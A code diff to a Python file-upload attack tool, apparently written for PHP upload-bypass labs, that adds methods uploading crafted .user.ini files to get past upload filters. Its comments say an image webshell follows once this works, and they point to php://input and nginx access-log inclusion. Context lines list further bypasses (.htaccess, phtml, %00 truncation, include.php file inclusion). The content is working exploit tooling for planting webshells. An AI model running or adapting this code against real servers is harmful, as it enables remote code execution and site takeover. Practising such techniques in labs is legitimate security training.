@@ -94,7 +94,8 @@ class FuzzUpload:
         return shell_url
 
     def get_upload_url(self, shell_path):
-        url = f'{host}/{upload_folder}/{shell_path}'
+        updir = f'{upload_folder}/' if upload_folder else ''
+        url = f'{host}/{updir}{shell_path}'
         return url
 
     def _update_file_fp(self, file_path, filename='file.pHP'):
@@ -251,6 +252,48 @@ class FuzzUpload:
         url1 = _get_host(url) + f'/include.php?file=any/{self.upload_url}'
         self.check(url1, absolute=True)
 
+    def upload3_userini(self):
+        print("Function name:", inspect.currentframe().f_code.co_name)
+
+        file_path = '.user.ini'
+        post_files = self._update_file_fp(file_path, filename=file_path)
+        post_data = data.copy()
+        # upload .htaccess
+        res = self.send_request(url=url, files=post_files, data=post_data)
+
+        check_url = self.get_upload_url('.user.ini')
+        check_res = self.requests.get(check_url, proxies=proxies)
+        if check_res.status_code != 404:
+            print('可以上传图片马 .user.ini ', open(file_path).read())
+
+    def upload3_userini1(self):
+        print("Function name:", inspect.currentframe().f_code.co_name)
+
+        file_path = '.user1.ini'
+        post_files = self._update_file_fp(file_path, filename='.user.ini')
+        post_data = data.copy()
+        # upload .htaccess
+        res = self.send_request(url=url, files=post_files, data=post_data)
+
+        check_url = self.get_upload_url('.user.ini')
+        check_res = self.requests.get(check_url, proxies=proxies)
+        if check_res.status_code != 404:
+            print('php://input, body发送 <?php phpinfo();?>', open(file_path).read())
+
+    def upload3_userini2(self):
+        print("Function name:", inspect.currentframe().f_code.co_name)
+
+        file_path = '.user2.ini'
+        post_files = self._update_file_fp(file_path, filename='.user.ini')
+        post_data = data.copy()
+        # upload .htaccess
+        res = self.send_request(url=url, files=post_files, data=post_data)
+
+        check_url = self.get_upload_url('.user.ini')
+        check_res = self.requests.get(check_url, proxies=proxies)
+        if check_res.status_code != 404:
+            print('/var/log/nginx/access.log .user.ini', open(file_path).read())
+
 
 def login():
     burp0_url = "http://127.0.0.1:80/dashboard/login.php"
@@ -275,6 +318,9 @@ if __name__ == '__main__':
     # fuzz_upload.upload1_basic()
     # fuzz_upload.upload2_1_script_language()
     # fuzz_upload.upload2_php5_phtml()
+    # fuzz_upload.upload3_userini()  # 成功后上传图片马即可
+    # fuzz_upload.upload3_userini1()  # 成功后上传图片马即可
+    # fuzz_upload.upload3_userini2()  # 成功后上传图片马即可
     # b_htaccess = fuzz_upload.upload3_htaccess()  # 成功后上传图片马即可
     # fuzz_upload.upload3_htaccess_only_jpg()  # 成功后上传图片马即可
     # fuzz_upload.upload4_percent00_pass11()
